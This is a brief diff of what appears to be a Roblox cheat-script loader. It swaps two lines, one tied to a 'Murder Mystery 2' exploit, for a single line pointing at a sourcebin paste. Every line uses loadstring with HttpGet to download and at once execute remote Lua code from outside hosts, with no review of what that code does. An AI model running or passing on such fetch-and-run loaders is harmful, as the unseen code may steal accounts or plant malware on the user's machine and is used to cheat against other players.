@@ -1,2 +1,1 @@
-loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-nexus-updated-15270"))()
-loadstring(game:HttpGet("https://eternal-darkness.org/loaders/3172d815695ea2f487fc18de57246d5f.lua"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/NMVlNnJBDU/0"))()
